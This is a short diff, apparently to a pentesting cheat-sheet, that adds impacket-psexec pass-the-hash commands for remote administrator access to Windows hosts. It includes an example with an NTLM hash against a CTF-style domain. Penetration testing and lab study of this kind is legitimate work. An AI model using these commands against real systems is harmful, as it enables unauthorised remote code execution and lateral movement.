@@ -28,4 +28,8 @@ impacket-psexec administrator:'<password>'@$ip
 # Connect to a remote machine with a local administrator account
 psexec.py $domain/$user:$password@$ip 
 
+# Connect to a machine passing the hash
+impacket-psexec $domain/$user@$ip -hashes $LM-authentication:$NTLM
+# Example:
+# impacket-psexec egotistical-bank.local/administrator@$ip -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
 ```
